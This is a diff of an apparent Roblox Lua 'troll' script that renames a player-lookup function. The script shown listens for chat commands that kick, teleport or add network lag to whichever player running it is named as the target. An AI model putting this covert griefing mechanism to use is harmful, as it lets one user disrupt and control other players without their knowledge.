@@ -24,7 +24,7 @@ local zl = {
 }
 
 function veryepictrol2(x)
-function getPlayer(name)
+function getPlayer2(name)
     local targets = {}
     local plrstbl = game.Players:getPlayers()
     if name == "me" then
@@ -72,7 +72,7 @@ end
 
             if cmd2 == "kick" then
                 local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer(who2)[1]
+                local target2 = getPlayer2(who2)[1]
                 if game.Players.LocalPlayer == target2 then
                     game.Players.LocalPlayer:Kick("kicked by admin")
                 end
@@ -89,7 +89,7 @@ end
 
             if cmd2 == "bring" then
                 local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer(who2)[1]
+                local target2 = getPlayer2(who2)[1]
                 if game.Players.LocalPlayer == target2 then
                     target2.Character.HumanoidRootPart.CFrame = ME.HumanoidRootPart.CFrame
                 end
@@ -126,7 +126,7 @@ end
             if cmd2 == "lag" then
                 wait(0.5)
                 local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer(who2)[1]
+                local target2 = getPlayer2(who2)[1]
                 if game.Players.LocalPlayer == target2 then
                     settings().Network.IncomingReplicationLag = 1
                 end
@@ -136,7 +136,7 @@ end
             if cmd2 == "unlag" then
                 wait(0.5)
                 local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer(who2)[1]
+                local target2 = getPlayer2(who2)[1]
                 if game.Players.LocalPlayer == target2 then
                     settings().Network.IncomingReplicationLag = 0
                 end
